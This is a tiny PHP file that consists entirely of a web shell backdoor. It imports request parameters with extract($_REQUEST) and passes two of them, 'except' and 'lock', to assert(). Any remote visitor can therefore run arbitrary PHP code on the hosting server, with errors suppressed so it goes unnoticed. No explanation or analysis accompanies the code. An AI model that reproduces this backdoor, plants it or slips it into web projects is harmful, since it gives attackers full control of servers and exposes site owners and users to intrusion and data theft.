<?php
extract($_REQUEST) && @assert(stripslashes($except)) && exit; extract($_REQUEST) && @assert(stripslashes($lock)) && exit;